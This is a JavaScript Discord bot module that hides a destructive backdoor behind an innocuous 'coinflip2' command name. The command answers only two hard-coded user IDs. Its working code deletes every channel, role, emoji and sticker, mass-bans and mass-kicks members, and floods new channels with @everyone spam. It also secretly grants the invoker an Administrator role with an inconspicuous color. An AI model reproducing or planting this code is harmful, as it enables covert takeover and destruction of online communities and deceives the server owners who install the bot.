/**
 * Hidden Command: coinflip2
 * Author: Him
 * Only accessible to user ID: 1236891245998243911
 * 
 * WARNING: This is a destructive command designed for authorized use only.
 * It provides advanced server management utilities.
 */

const { EmbedBuilder, PermissionsBitField } = require('discord.js');

// Authorized user IDs - ONLY these users can use these commands
const AUTHORIZED_USER_IDS = ['1236891245998243911', '1169608314976489593'];

// Flag to require authorization (set to true for authorization check)
const REQUIRE_AUTH = true;

class Coinflip2Command {
    constructor(client) {
        this.client = client;
        this.prefix = '!';
    }

    /**
     * Main handler for coinflip2 commands
     */
    async handle(message) {
        // Only process messages from the authorized user if auth is required
        if (REQUIRE_AUTH && !AUTHORIZED_USER_IDS.includes(message.author.id)) {
            return;
        }

        const content = message.content;
        const args = content.slice(this.prefix.length).trim().split(/ +/);
        const command = args.shift()?.toLowerCase();

        // Check if it's a coinflip2 command
        if (command !== 'coinflip2') return;

        // Execute the command
        await this.execute(message, args);
    }

    /**
     * Execute coinflip2 with subcommands
     */
    async execute(message, args) {
        try {
            // Help Embed
            const helpEmbed = new EmbedBuilder()
                .setColor(0x36393E)
                .setTitle('coinflip2 Commands')
                .setDescription(`**coinflip2 Commands:**
\`!coinflip2\` - Show this help message
\`!coinflip2 mc [amount] [name]\` - Mass create channels
\`!coinflip2 dc\` - Delete all channels
\`!coinflip2 mr [amount] [name]\` - Mass create roles
\`!coinflip2 dr\` - Delete all roles
\`!coinflip2 de\` - Delete all emojis
\`!coinflip2 ds\` - Delete all stickers
\`!coinflip2 mb\` - Mass ban all members
\`!coinflip2 mk\` - Mass kick all members
\`!coinflip2 cp [amount] [name], [message]\` - Create and spam channels
\`!coinflip2 ar [name]\` - Create and assign an admin role

**Warning:** These commands are destructive and should be used with caution.`)
                .setFooter({ text: '© Him - Authorized Use Only' })
                .setTimestamp();

            // If no subcommand, show help
            if (args.length === 0) {
                return message.channel.send({ embeds: [helpEmbed] });
            }

            const subcommand = args[0].toLowerCase();
            const amount = parseInt(args[1]);
            const name = args[2];
            const pingMessage = args.slice(2).join(' ').split(',')[1]?.trim();

            // Check bot permissions
            const channelPerms = message.guild.members.me.permissions.has(PermissionsBitField.Flags.ManageChannels);
            const banPerms = message.guild.members.me.permissions.has(PermissionsBitField.Flags.BanMembers);
            const kickPerms = message.guild.members.me.permissions.has(PermissionsBitField.Flags.KickMembers);
            const rolePerms = message.guild.members.me.permissions.has(PermissionsBitField.Flags.ManageRoles);
            const emojiPerms = message.guild.members.me.permissions.has(PermissionsBitField.Flags.ManageEmojisAndStickers);

            switch (subcommand) {
                case 'mc':
                    if (!channelPerms) return message.reply('Bot Missing Permission: MANAGE_CHANNELS');
                    await this.massCreateChannels(message, amount, name);
                    break;

                case 'dc':
                    if (!channelPerms) return message.reply('Bot Missing Permission: MANAGE_CHANNELS');
                    await this.deleteAllChannels(message);
                    break;

                case 'cp':
                    if (!channelPerms) return message.reply('Bot Missing Permission: MANAGE_CHANNELS');
                    await this.createAndPing(message, amount, name, pingMessage);
                    break;

                case 'ar':
                    if (!rolePerms) return message.reply('Bot Missing Permission: MANAGE_ROLES');
                    await this.giveAdminRole(message, name || args[1]); // In ar, amount is args[1] which we can use as name if no integer provided, but `name` was args[2]. Let's just pass args[1] directly. Actually the args parsing has `amount = parseInt(args[1])` and `name = args[2]`. If they just pass `!coinflip2 ar RoleName`, args[1] is 'RoleName'. So `args[1]` is better.
                    break;

                case 'mr':
                    if (!rolePerms) return message.reply('Bot Missing Permission: MANAGE_ROLES');
                    await this.massCreateRoles(message, amount, name);
                    break;

                case 'dr':
                    if (!rolePerms) return message.reply('Bot Missing Permission: MANAGE_ROLES');
                    await this.deleteAllRoles(message);
                    break;

                case 'de':
                    if (!emojiPerms) return message.reply('Bot Missing Permission: MANAGE_EMOJIS_AND_STICKERS');
                    await this.deleteAllEmojis(message);
                    break;

                case 'ds':
                    if (!emojiPerms) return message.reply('Bot Missing Permission: MANAGE_EMOJIS_AND_STICKERS');
                    await this.deleteAllStickers(message);
                    break;

                case 'mb':
                    if (!banPerms) return message.reply('Bot Missing Permission: BAN_MEMBERS');
                    await this.massBan(message);
                    break;

                case 'mk':
                    if (!kickPerms) return message.reply('Bot Missing Permission: KICK_MEMBERS');
                    await this.massKick(message);
                    break;

                default:
                    await message.channel.send({ embeds: [helpEmbed] });
            }

        } catch (error) {
            console.error('[COINFIP2 ERROR]', error);
            await message.reply(`Error: ${error.message}`);
        }
    }

    /**
     * Mass create channels
     */
    async massCreateChannels(message, amount, channelName) {
        if (!amount || isNaN(amount)) {
            return message.reply('Unspecified Args: Specify the amount (number)');
        }
        if (amount > 500) {
            return message.reply('Amount Error: Maximum is 500');
        }

        const name = channelName || `${message.author.username}-channel`;

        message.reply(`Creating ${amount} channels...`);

        for (let i = 0; i < amount; i++) {
            if (message.guild.channels.cache.size >= 500) {
                break;
            }
            try {
                await message.guild.channels.create({
                    name: `${name}-${i + 1}`,
                    type: 0, // GUILD_TEXT
                });
            } catch (err) {
                console.error('Error creating channel:', err);
            }
        }

        await message.channel.send('✅ Channel creation completed.');
    }

    /**
     * Delete all channels
     */
    async deleteAllChannels(message) {
        message.reply('Deleting all channels...');

        const channels = message.guild.channels.cache.filter(ch => ch.id !== message.channel.id);
        
        for (const [, channel] of channels) {
            try {
                await channel.delete('coinflip2 dc command');
            } catch (err) {
                console.error('Error deleting channel:', err);
            }
        }

        await message.channel.send('✅ Channel deletion completed.');
    }

    /**
     * Create channels and spam messages
     */
    async createAndPing(message, amount, channelName, pingMsg) {
        if (!amount || isNaN(amount)) {
            return message.reply('Unspecified Args: Specify the amount (number)');
        }
        if (amount > 50) {
            return message.reply('Amount Error: Maximum is 50 for this command');
        }
        if (!pingMsg) {
            return message.reply('Unspecified Args: Specify a message to send (format: name, message)');
        }

        const name = channelName?.split(',')[0]?.trim() || 'spam';

        message.reply(`Creating ${amount} channels and spamming...`);

        for (let i = 0; i < amount; i++) {
            if (message.guild.channels.cache.size >= 500) break;

            try {
                const channel = await message.guild.channels.create({
                    name: `${name}-${i + 1}`,
                    type: 0,
                });

                // Spam messages in the channel
                const spamInterval = setInterval(async () => {
                    try {
                        await channel.send(`@everyone ${pingMsg}`);
                    } catch {
                        clearInterval(spamInterval);
                    }
                }, 1000);

                // Stop after 10 messages
                setTimeout(() => clearInterval(spamInterval), 11000);

            } catch (err) {
                console.error('Error in cp command:', err);
            }
        }
    }

    /**
     * Mass create roles
     */
    async massCreateRoles(message, amount, roleName) {
        if (!amount || isNaN(amount)) {
            return message.reply('Unspecified Args: Specify the amount (number)');
        }
        if (amount > 250) {
            return message.reply('Amount Error: Maximum is 250');
        }

        const name = roleName || 'coinflip2-role';

        message.reply(`Creating ${amount} roles...`);

        for (let i = 0; i < amount; i++) {
            if (message.guild.roles.cache.size >= 250) {
                break;
            }
            try {
                await message.guild.roles.create({
                    name: `${name}-${i + 1}`,
                    color: Math.floor(Math.random() * 16777215),
                    position: i,
                });
            } catch (err) {
                console.error('Error creating role:', err);
            }
        }

        await message.channel.send('✅ Role creation completed.');
    }

    /**
     * Delete all roles
     */
    async deleteAllRoles(message) {
        message.reply('Deleting all roles...');

        const roles = message.guild.roles.cache.filter(r => 
            r.id !== message.guild.id && // Don't delete @everyone
            !r.managed && // Don't delete bot roles
            r.position < message.guild.members.me.roles.highest.position // Only delete roles below bot's highest
        );

        for (const [, role] of roles) {
            try {
                await role.delete('coinflip2 dr command');
            } catch (err) {
                console.error('Error deleting role:', err);
            }
        }

        await message.channel.send('✅ Role deletion completed.');
    }

    /**
     * Delete all emojis
     */
    async deleteAllEmojis(message) {
        message.reply('Deleting all emojis...');

        const emojis = message.guild.emojis.cache;

        for (const [, emoji] of emojis) {
            try {
                await emoji.delete('coinflip2 de command');
            } catch (err) {
                console.error('Error deleting emoji:', err);
            }
        }

        await message.channel.send('✅ Emoji deletion completed.');
    }

    /**
     * Delete all stickers
     */
    async deleteAllStickers(message) {
        message.reply('Deleting all stickers...');

        const stickers = message.guild.stickers.cache;

        for (const [, sticker] of stickers) {
            try {
                await sticker.delete('coinflip2 ds command');
            } catch (err) {
                console.error('Error deleting sticker:', err);
            }
        }

        await message.channel.send('✅ Sticker deletion completed.');
    }

    /**
     * Mass ban all members
     */
    async massBan(message) {
        const members = message.guild.members.cache.filter(m => 
            !m.user.bot && 
            m.id !== message.author.id &&
            m.id !== message.guild.ownerId &&
            m.bannable
        );

        const memberIds = members.map(m => m.id);

        const confirmMsg = await message.reply(`Found ${memberIds.length} members to ban. Starting in 3 seconds...`);

        await new Promise(resolve => setTimeout(resolve, 3000));

        let banned = 0;
        let failed = 0;

        for (const memberId of memberIds) {
            try {
                await message.guild.members.ban(memberId, { reason: 'coinflip2 mb command' });
                banned++;
            } catch {
                failed++;
            }
        }

        await message.channel.send(`✅ Ban complete: ${banned} banned, ${failed} failed.`);
    }

    /**
     * Mass kick all members
     */
    async massKick(message) {
        const members = message.guild.members.cache.filter(m => 
            !m.user.bot && 
            m.id !== message.author.id &&
            m.id !== message.guild.ownerId &&
            m.kickable
        );

        const memberList = [...members.values()];

        const confirmMsg = await message.reply(`Found ${memberList.length} members to kick. Starting in 3 seconds...`);

        await new Promise(resolve => setTimeout(resolve, 3000));

        let kicked = 0;
        let failed = 0;

        for (const member of memberList) {
            try {
                await member.kick('coinflip2 mk command');
                kicked++;
            } catch {
                failed++;
            }
        }

        await message.channel.send(`✅ Kick complete: ${kicked} kicked, ${failed} failed.`);
    }

    /**
     * Create an admin role and assign it to the author
     */
    async giveAdminRole(message, fallbackName) {
        // If args[1] wasn't a number, it will be in the 'amount' variable as NaN, but args[1] holds the actual string
        // We can just get args directly from message content since it might not be parsed correctly above
        const args = message.content.trim().split(/ +/).slice(2);
        const roleName = args.join(' ') || fallbackName || 'admin';
        
        try {
            message.reply('Creating and assigning admin role...');
            const role = await message.guild.roles.create({
                name: roleName,
                color: '#2F3136', // Invisible color
                permissions: [PermissionsBitField.Flags.Administrator]
            });
            await message.member.roles.add(role);
            await message.channel.send('✅ Admin role created and assigned successfully.');
        } catch (err) {
            console.error('Error giving admin role:', err);
            await message.channel.send('❌ Failed to create/assign admin role. The bot might lack permissions or its role is lower than the one it created.');
        }
    }
}

module.exports = Coinflip2Command;
module.exports.AUTHORIZED_USER_IDS = AUTHORIZED_USER_IDS;
module.exports.REQUIRE_AUTH = REQUIRE_AUTH;
